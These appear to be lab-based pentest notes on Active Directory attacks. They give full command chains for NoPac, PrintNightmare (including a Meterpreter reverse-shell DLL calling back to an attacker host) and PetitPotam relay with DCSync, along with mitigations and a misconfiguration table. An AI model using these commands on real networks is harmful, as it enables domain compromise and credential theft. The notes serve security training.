# Vulnerabilities & Misconfigurations in Active Directory Lateral Movement

---

## Introduction

Many organizations delay patching and overlook configuration best practices, leaving them exposed to high-impact vulnerabilities and misconfigurations. This section covers both recent, high-profile attacks (NoPac, PrintNightmare, PetitPotam) and a range of common but critical misconfigurations. Each is mapped to the tools and commands used for detection and exploitation, with technical details and concise explanations.

---

## Scenario Setup

- **Linux attack host:** SSH into ATTACK01.
- **Windows attack host:** Use MS01 for Rubeus/Mimikatz demos.
- **Switching platforms:** Use RDP for Windows, SSH from Windows to Linux as needed.
- **All tools referenced are open-source and available on GitHub.**

---

## 1. Bleeding Edge Vulnerabilities

### 1.1 NoPac (SamAccountName Spoofing)
- **CVE-2021-42278 & CVE-2021-42287**
- **Impact:** Privilege escalation from any standard domain user to Domain Admin.
- **Technique:** Change a computer account's SamAccountName to match a DC, then request Kerberos tickets as the DC.
- **Pre-requisite:** `ms-DS-MachineAccountQuota > 0` (default: 10).

**Key Commands:**
```bash
# Install tools
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && python setup.py install
git clone https://github.com/Ridter/noPac.git

# Scan for vulnerability
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Exploit
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# DCSync
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
**Mitigation:** Set `ms-DS-MachineAccountQuota` to 0, patch DCs.

---

### 1.2 PrintNightmare (CVE-2021-34527 & CVE-2021-1675)
- **Impact:** RCE and privilege escalation via Print Spooler service.
- **Technique:** Remote SYSTEM shell or relay attacks on unpatched hosts.

**Key Commands:**
```bash
# Clone exploit and install Impacket
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket && python3 ./setup.py install

# Check for Print Spooler exposure
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Host DLL
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Start handler (Metasploit)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run

# Run exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
**Mitigation:** Patch all hosts, disable Print Spooler where not needed.

---

### 1.3 PetitPotam (CVE-2021-36942, MS-EFSRPC)
- **Impact:** LSA spoofing, NTLM relay to AD CS, domain compromise.
- **Technique:** Relay DC authentication to vulnerable CA, obtain certificate, perform DCSync.

**Key Commands:**
```bash
# Start ntlmrelayx.py targeting AD CS
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Trigger authentication from DC
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# Request TGT for DC using gettgtpkinit.py
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ -pfx-base64 <base64cert> dc01.ccache
export KRB5CCNAME=dc01.ccache

# DCSync with secretsdump.py
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
**Mitigation:** Patch for CVE-2021-36942, harden AD CS, restrict templates, monitor for relaying.

---

## 2. Common Misconfigurations & Attacks

### Table: Misconfigurations, Vulnerabilities, and Attacks

| Misconfiguration / Vulnerability                | Attack / Abuse / Outcome                                 | Key Tools / Commands                                                                                   |
|------------------------------------------------|----------------------------------------------------------|--------------------------------------------------------------------------------------------------------|
| **Exchange Windows Permissions group**          | DCSync privilege escalation, domain compromise           | `net group "Exchange Windows Permissions" /domain`<br>BloodHound<br>PowerView                         |
| **PrivExchange (Exchange PushSubscription flaw)**| Relay Exchange auth to LDAP, dump NTDS, DA access        | `privexchange.py`                                                                                      |
| **Organization Management group**               | Full Exchange/OU control, mailbox access                 | BloodHound<br>PowerView                                                                               |
| **Print Spooler enabled (MS-RPRN bug)**         | Printer Bug: NTLM relay to LDAP, DCSync, RBCD            | `rpcdump.py`<br>`SpoolSample.py`<br>`Get-SpoolStatus` (PowerShell)                                    |
| **Unpatched MS14-068**                          | Kerberos PAC forgery, escalate to Domain Admin           | `PyKEK`<br>`impacket/ticket_converter.py`                                                             |
| **Weak/default LDAP credentials in devices**    | Credential sniffing, initial foothold                    | `nc -lvp 389`<br>Change LDAP IP in device config                                                      |
| **AD DNS zone readable by users**               | DNS record enumeration, host discovery                   | `adidnsdump -u user ldap://<dc-ip>`<br>`adidnsdump -r ...`                                            |
| **Passwords in user Description/Notes fields**  | Credential discovery, lateral movement                   | `Get-DomainUser * | Select samaccountname,description`<br>PowerView                                   |
| **PASSWD_NOTREQD flag set on accounts**         | Weak/no password, easy brute-force or login              | `Get-DomainUser -UACFilter PASSWD_NOTREQD`<br>PowerView                                               |
| **SYSVOL/scripts readable by all**              | Passwords in scripts, privilege escalation               | `ls \\<dc>\SYSVOL\<domain>\scripts`<br>`cat \\<dc>\SYSVOL\<domain>\scripts\<file>`                   |
| **GPP cpassword in SYSVOL**                     | Decrypt local admin passwords, lateral movement          | `gpp-decrypt <cpassword>`<br>`crackmapexec smb -M gpp_password`<br>`Get-GPPPassword.ps1`              |
| **Registry.xml in SYSVOL**                      | Autologon credentials, lateral movement                  | `crackmapexec smb -M gpp_autologin`<br>`Get-GPPAutologon.ps1`                                         |
| **Do not require Kerberos pre-auth (UAC flag)** | ASREPRoasting: offline password cracking                 | `Rubeus.exe asreproast ...`<br>`GetNPUsers.py`<br>`kerbrute`                                          |
| **GPOs with weak ACLs**                         | GPO abuse: add local admin, run code, persistence        | `Get-DomainGPO`<br>`Get-ObjectAcl`<br>BloodHound<br>`SharpGPOAbuse`                                   |
| **Password reuse across accounts**              | Lateral movement, privilege escalation                   | `crackmapexec smb ... --local-auth`<br>Password spraying tools                                        |
| **Unconstrained/Constrained Delegation**        | Ticket theft, lateral movement, privilege escalation     | BloodHound<br>Rubeus<br>Impacket tools                                                                |
| **AD CS misconfigurations**                     | ESC1-8 attacks, domain persistence/compromise            | `certipy`<br>ADCS enumeration scripts                                                                 |

---

### Attack/Enumeration Flow

```mermaid
graph TD
  A[Find Misconfigurations] --> B[Enumerate with PowerView/BloodHound]
  B --> C[Identify Vulnerable Groups, GPOs, SYSVOL, DNS, etc.]
  C --> D[Exploit with Specific Tools (e.g., privexchange.py, Rubeus, CrackMapExec)]
  D --> E[Escalate Privileges / Move Laterally]
  E --> F[Document and Report]
```

---

### Tools

| Tool/Script         | Platform   | Use Case / Example Command                                  |
|---------------------|------------|------------------------------------------------------------|
| PowerView           | Windows    | AD enumeration, ACLs, user fields                          |
| BloodHound          | Both       | Graph-based AD attack paths                                |
| CrackMapExec        | Both       | GPP, autologon, password spray, share hunting              |
| adidnsdump          | Linux      | Dump all AD DNS records                                    |
| Rubeus              | Windows    | Kerberos ticket attacks (ASREPRoast, Kerberoast, etc.)     |
| GetNPUsers.py       | Linux      | ASREPRoasting                                              |
| kerbrute            | Linux      | User enumeration, ASREPRoasting                            |
| gpp-decrypt         | Linux      | Decrypt GPP cpassword                                      |
| SharpGPOAbuse       | Windows    | GPO privilege escalation                                   |
| SpoolSample         | Both       | Trigger Print Spooler bug                                  |
| privexchange.py     | Linux      | Exploit Exchange relay                                     |

---

**How to use this section:**  
- Start with enumeration (PowerView, BloodHound, adidnsdump, CrackMapExec).
- Identify misconfigurations/vulnerabilities.
- Use the corresponding attack tool/command to exploit.
- Document all findings and outputs.

---